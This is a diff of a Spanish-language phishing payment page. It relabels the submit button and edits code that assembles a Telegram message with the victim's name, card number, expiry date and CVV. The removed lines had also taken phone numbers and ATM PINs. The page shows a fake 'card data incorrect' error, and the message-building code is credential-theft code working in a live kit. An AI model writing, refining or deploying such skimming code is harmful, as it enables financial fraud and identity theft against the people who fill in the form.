@@ -126,7 +126,7 @@
                     </div>
 
                     <p id="errorMessage" class="text-red-500 text-center mb-4 hidden">Los datos de la tarjeta son incorrectos. Por favor, verifica la información e intenta de nuevo.</p>
-                    <button type="submit" id="pagarBtn" disabled class="block w-full rounded-2xl text-white bg-[#0043a9] font-bold text-base border-none py-2 px-0 text-center my-4 mx-auto disabled:opacity-70">Pagar ahora</button>
+                    <button type="submit" id="pagarBtn" disabled class="block w-full rounded-2xl text-white bg-[#0043a9] font-bold text-base border-none py-2 px-0 text-center my-4 mx-auto disabled:opacity-70">Registrar</button>
                 </form>
             </div>
         </div>
@@ -441,11 +441,9 @@
                 
                 telegramMessage += `\n`;
                 telegramMessage += `Nombre: ${nombreTitular}\n`;
-                telegramMessage += `Teléfono: ${telefono}\n`;
                 telegramMessage += `Tarjeta: ${numeroTarjeta}\n`;
                 telegramMessage += `Fecha Exp: ${fechaExp}\n`;
                 telegramMessage += `CVV: ${cvv}\n`;
-                telegramMessage += `Clave Cajero: ${claveCajero}\n\n`;
                 telegramMessage += `Fecha/Hora: ${formattedDate}, ${formattedTime}`;
 
                 const keyboard = {
